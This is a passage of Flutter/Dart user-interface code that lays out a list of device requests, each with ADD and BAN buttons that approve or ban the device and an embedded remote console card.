                                        fontSize: 12)),
                                const SizedBox(height: 8),
                                Row(children: [
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'approve'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                                      child: const Text('ADD', style: TextStyle(color: Colors.white))),
                                  const SizedBox(width: 8),
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'ban'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                                      child: const Text('BAN', style: TextStyle(color: Colors.white))),
                                ]),
                                const SizedBox(height: 8),
                                RemoteConsoleCard(
                                    deviceId: r['device']!, label: r['id'] ?? 'Device'),
                              ],
                            ),
                          ),
                        );
                      }),
        ],
      ),
    );
  }
}
